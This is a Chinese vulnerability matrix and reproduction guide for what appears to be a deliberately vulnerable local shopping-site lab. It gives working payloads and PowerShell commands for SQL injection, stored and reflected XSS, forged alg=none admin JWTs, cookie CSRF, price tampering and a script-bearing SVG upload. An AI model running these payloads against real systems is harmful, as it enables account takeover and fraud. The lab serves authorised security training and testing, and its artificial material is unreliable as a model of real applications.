# 星澜优选 · 漏洞入口矩阵（V01–V10 / N01–N06）

> 基线：`http://127.0.0.1:8081`（hash 路由），`NODE_ENV=stellarpick`，reset 后固定数据。
> 所有 payload 仅用于本地授权演示。前端红线：入口可达、行为不被前端修复。
> 机器可读版本：[ground-truth.json](ground-truth.json)；演示流程：[演示脚本.md](演示脚本.md)。

| V03 | `/#/search?q=` | `q=<img src=x onerror="window.__v03=1">` | 结果头“关于「…」的 N 件商品”在 DOM 中保留 `onerror`，`window.__v03===1` | 结果头 `bypassSecurityTrustHtml` + `[innerHTML]`，不 escape |
| V04 | `/#/product/1003` → 评价 tab（`#tab-reviews`） | 种子评价已含 `<img src=x onerror="window.__v04_seed=1" style="display:none">`；也可 `PUT /rest/products/1003/reviews`，body `{"message":"<img src=x onerror=\"window.__v04=1\">很好用","author":"alice@stellarpick.example"}` | 打开评价 tab 即触发 `window.__v04_seed=1`；PUT 返回 201，再次打开后 `window.__v04===1`；评价正文原样渲染 | 评价正文原样存取、`bypassSecurityTrustHtml` 渲染，不 sanitize |

| V06 | 会员登录 → 地址栏输入 `/#/admin/users` | `GET /api/admin/users`（alice Bearer） | 200；`total=8`、8 行；页面正常渲染表格 | 菜单按角色隐藏，`/admin` 仅 `authGuard`，无 roleGuard |
| V07 | 登录后改 `localStorage['token']` | alg=none token：header `{"alg":"none","typ":"JWT"}` + payload `{"data":{"id":1,"role":"admin","email":"admin@stellarpick.example"}}` + 空签名 | `/api/admin/settings` 200、`/api/admin/users` 200；原生 `/api/Users` 也 200；刷新后菜单出现“平台后台” | 只 base64 解 payload，不验签；基座 `express-jwt 0.1.3 + jsonwebtoken 0.4.0` 同样接受 alg=none |

| V09 | `/#/cart` → `/#/checkout`；或代理改包 | `POST /api/cart/items` `{"productId":1003,"quantity":1,"unitPrice":0.01}`；`POST /api/checkout` `{"items":[{"productId":1003,"unitPrice":0.01,"quantity":1}]}` | 购物车 total=0.01；订单 total=0.01；详情 total=0.01 | 请求体带 unitPrice，服务端不重算、不比对商品价 |
| V10 | `/#/account/profile` 头像上传 | `POST /api/account/avatar`，multipart `file=avatar.svg`（含 `<script>alert("V10")</script>`） | 200，返回 `/uploads/xxx.svg`；直接打开：200，`Content-Type: image/svg+xml`，脚本执行 | 不校验扩展名/MIME/魔数，`/uploads` 同源内联返回 |

### V08 的准确语义

V08 **不是**“Bearer 无法跨站携带”的弱结论，而是**真正的 Cookie CSRF**：

1. `POST /rest/user/login` 在返回 JWT 的同时 `res.cookie('sp_token', token, {httpOnly:true, sameSite:'none', secure:true})`。
2. `/api/account/email` 的 `emailAuth` 优先读取 `sp_token` Cookie，验签后直接当作已登录用户；不校验 CSRF token、Origin、Referer。
3. 第三方页面（`http://localhost:8081/lab/csrf.html`）向 `http://127.0.0.1:8081/api/account/email` 自动提交普通表单，浏览器自动带上 Cookie → 204，邮箱被改。
4. 实测：`Cookie: sp_token=...` + `Origin: http://evil.example` → 204；无 Cookie/无 Bearer → 401。

> 旧文档“Bearer localStorage 无法跨站自动携带，所以 V08 不是真 CSRF”只适用于加入 Cookie 之前的版本；当前实现已具备完整 CSRF 链。前端仍把 JWT 放在 `localStorage['token']` 供常规 API 使用。

## 2. 复现命令（PowerShell）

```powershell
$base = 'http://127.0.0.1:8081'
$alice = (Invoke-RestMethod "$base/rest/user/login" -Method Post -ContentType 'application/json' -Body '{"email":"alice@stellarpick.example","password":"Alice@2026"}').authentication.token
$admin = (Invoke-RestMethod "$base/rest/user/login" -Method Post -ContentType 'application/json' -Body '{"email":"admin@stellarpick.example","password":"admin123"}').authentication.token
$h = @{ Authorization = "Bearer $alice" }

# V01
$q = [uri]::EscapeDataString("')) UNION SELECT * FROM Products WHERE deletedAt IS NOT NULL--")
$r = Invoke-RestMethod "$base/rest/products/search?q=$q"
"V01 rows=$($r.data.Count) hidden=$((($r.data | Where-Object id -eq 1021).name))"

# V01 错误证据
try { Invoke-WebRequest "$base/rest/products/search?q=$([uri]::EscapeDataString("')"))" } catch { $_.Exception.Response.StatusCode.value__ }

# V02
$v02 = Invoke-RestMethod "$base/rest/user/login" -Method Post -ContentType 'application/json' -Body '{"email":"'' OR 1=1--","password":"x"}'
"V02 token=$([bool]$v02.authentication.token)"

# V05
$v05 = Invoke-RestMethod "$base/api/orders/1002" -Headers $h
"V05 owner=$($v05.ownerName) email=$($v05.ownerEmail) total=$($v05.total)"

# V06
$v06 = Invoke-RestMethod "$base/api/admin/users" -Headers $h
"V06 rows=$($v06.total)"

# V07（Node 生成 alg=none token）
$forged = node -e "const b=o=>Buffer.from(JSON.stringify(o)).toString('base64url');process.stdout.write(b({alg:'none',typ:'JWT'})+'.'+b({data:{id:1,role:'admin',email:'admin@stellarpick.example'}})+'.')"
(Invoke-WebRequest "$base/api/admin/settings" -Headers @{ Authorization = "Bearer $forged" }).StatusCode

# V08（Cookie CSRF；随后恢复邮箱）
Invoke-WebRequest "$base/api/account/email" -Method Post -Headers @{ Cookie = "sp_token=$alice"; Origin = 'http://evil.example' } -ContentType 'application/x-www-form-urlencoded' -Body 'email=csrf@example.com' | Select-Object StatusCode
Invoke-RestMethod "$base/api/account/email" -Method Post -Headers $h -ContentType 'application/json' -Body '{"email":"alice@stellarpick.example"}'

# V09
Invoke-RestMethod "$base/api/cart/items" -Method Post -Headers $h -ContentType 'application/json' -Body '{"productId":1003,"quantity":1,"unitPrice":0.01}'
$co = Invoke-RestMethod "$base/api/checkout" -Method Post -Headers $h -ContentType 'application/json' -Body '{"items":[{"productId":1003,"unitPrice":0.01,"quantity":1,"title":"保温杯","image":"sp-1003.svg"}]}'
"V09 total=$($co.total)"

# V10
# 浏览器打开 http://127.0.0.1:8081/#/account/profile，上传含 <script> 的 avatar.svg，再打开返回的 /uploads/xxx.svg
```

V03/V04 需要真实 DOM，建议直接用 `tools/e2e/verify-v.mjs`（Playwright）复现；V10 的脚本执行也建议用浏览器打开上传后的 URL。

## 4. 判定口径

- 每条连续复现 3 次结果一致；
- 至少保留 1 条请求/响应证据（HAR、curl 输出、截图、DOM 片段）；
- 只按“页面回显/接口响应”判定，不写“安全通过”这类无法证伪的断言；
- 演示 payload 只用 alert/console，不用 document.write，避免破版；
- V04/V09/V10 会改状态：V08 记得恢复邮箱，V09 用 `POST /lab/reset?confirm=1` 清订单，V10 清 `uploads/`。
